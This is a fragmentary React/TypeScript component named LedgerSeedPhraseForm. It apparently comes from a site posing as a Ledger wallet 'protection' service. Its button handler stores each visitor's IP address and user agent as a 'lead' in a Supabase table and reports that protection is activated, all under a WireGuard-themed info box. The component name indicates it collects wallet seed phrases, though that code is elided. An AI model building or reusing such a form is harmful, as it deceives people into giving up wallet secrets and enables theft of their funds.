...
interface LedgerSeedPhraseFormProps {
  onSuccess: () => void;
}
  ...
  const handleActivateProtection = async () => {
    ...
    try {
      ...
      await supabase
        .from('user_leads')
        .insert({
          username: `ledger_wallet_${Date.now()}`,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          status: 'active',
          commercial_name: commercialName,
          name: 'Ledger Wallet User'
        });
      ...
      console.log('Ledger wallet protection activated successfully');
    ...
    <Card className="bg-gray-800 border-gray-700">
      ...
      <CardContent className="space-y-6">
        ...
        <Button 
          ...
          disabled={isLoading}
          className="w-full bg-white hover:bg-gray-100 text-gray-900 font-semibold py-3 text-base"
        >
          {isLoading ? (
            <>
        ...
        {/* WireGuard Info Box */}
        <div className="bg-gray-700 border border-white/30 rounded-lg p-4">
...
export default LedgerSeedPhraseForm;